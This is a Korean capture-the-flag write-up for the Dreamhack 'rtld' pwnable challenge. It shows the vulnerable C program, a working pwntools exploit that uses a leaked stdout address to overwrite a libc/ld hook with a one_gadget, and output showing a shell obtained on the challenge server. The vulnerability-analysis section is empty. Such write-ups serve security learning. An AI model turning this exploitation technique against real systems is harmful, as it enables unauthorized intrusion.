---
title: Dreamhack wargame rtld write-up
tags: [Dreamhack, pwnable, rtld]
style: 
color: 
description: stack 영역에서 발생하는 취약점을 알아보자. 
---

# 다음에 계속!

## Code Analysis
---
``` c
// gcc -o rtld rtld.c -fPIC -pie

#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>
#include <dlfcn.h>

void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}

void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    signal(SIGALRM, alarm_handler);
    alarm(60);
}

void get_shell() {
    system("/bin/sh");
}

int main()
{
    long addr;
    long value;

    initialize();

    printf("stdout: %p\n", stdout);

    printf("addr: ");
    scanf("%ld", &addr);

    printf("value: ");
    scanf("%ld", &value);

    *(long *)addr = value;
    return 0;
}
```
<br>

## Vulnerability Analysis
---


<br>

## Exploit
---
``` python
#rtld.py
from pwn import *
# context.log_level = 'debug'

p = remote('host1.dreamhack.games', 23493)
libc = ELF('./libc.so.6')

# p = process('./rtld')
# e = ELF('./rtld')
# libc = e.libc

one_gadget_list = [0x45216, 0x4526a, 0xf02a4, 0xf1147]

p.recvuntil('stdout: ')
stdout = int(p.recv(14), 16)
libc_base = stdout - libc.sym['_IO_2_1_stdout_']
rtld_recursive = libc_base + 0x5f0f48
one_gadget = libc_base + one_gadget_list[3]

print('stdout: ' + hex(stdout))
print('libc_base: ' + hex(libc_base))

p.sendlineafter('addr: ', str(rtld_recursive))
p.sendlineafter('value: ', str(one_gadget))

p.interactive()
```

<br>

``` sh
❯ python3 rtld.py
[+] Opening connection to host1.dreamhack.games on port 18122: Done
[*] '/root/pwn/dreamhack/rtld/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
stdout: 0x7fefdfe46620
libc_base: 0x7fefdfa81000
[*] Switching to interactive mode
$ id
uid=1000(rtld) gid=1000(rtld) groups=1000(rtld)
```
쉘을 획득했다.
<br><br>

### Good Game!
EZ<br><br>